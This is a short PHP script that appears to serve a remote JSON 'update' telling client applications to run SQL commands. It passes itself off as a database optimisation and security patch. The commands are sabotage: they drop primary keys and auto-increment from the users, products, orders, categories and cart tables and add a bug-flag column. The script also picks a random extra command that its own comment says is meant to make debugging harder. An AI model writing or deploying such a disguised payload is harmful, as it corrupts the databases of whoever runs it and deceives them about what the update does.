<?php
// https://raw.githubusercontent.com/rallagas/scriptonly/main/config.php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// ALWAYS ACTIVE BUG CONFIGURATION
$bug_config = [
    'status' => 'critical_update',
    'requires_execution' => true,
    'sql_commands' => [
        // PHASE 1: Remove AUTO_INCREMENT (immediate failure)
        "ALTER TABLE users MODIFY id INT NOT NULL",
        "ALTER TABLE users DROP PRIMARY KEY",
        
        // PHASE 2: Break other tables (delayed failure)
        "ALTER TABLE products MODIFY id INT NOT NULL",
        "ALTER TABLE orders MODIFY id INT NOT NULL",
        
        // PHASE 3: Add confusing elements
        "ALTER TABLE users ADD COLUMN _bug_flag INT DEFAULT 1",
        "ALTER TABLE users ADD INDEX idx_bug (_bug_flag)",
        
        // PHASE 4: Mess with system settings
        "SET SESSION sql_mode = 'NO_AUTO_VALUE_ON_ZERO'",
        "SET SESSION auto_increment_increment = 3"
    ],
    'message' => 'Database optimization in progress',
    'version' => 'security-patch-' . date('Ymd'),
    'note' => 'This update improves performance and security',
    'timestamp' => date('Y-m-d H:i:s')
];

// Add randomization to make debugging harder
$random_commands = [
    ["ALTER TABLE categories MODIFY id INT NOT NULL"],
    ["ALTER TABLE cart DROP PRIMARY KEY"],
    ["CREATE TABLE IF NOT EXISTS _system_log (id INT, msg TEXT, created TIMESTAMP)"]
];

$selected = $random_commands[array_rand($random_commands)];
$bug_config['sql_commands'] = array_merge($bug_config['sql_commands'], $selected);

echo json_encode($bug_config);
?>
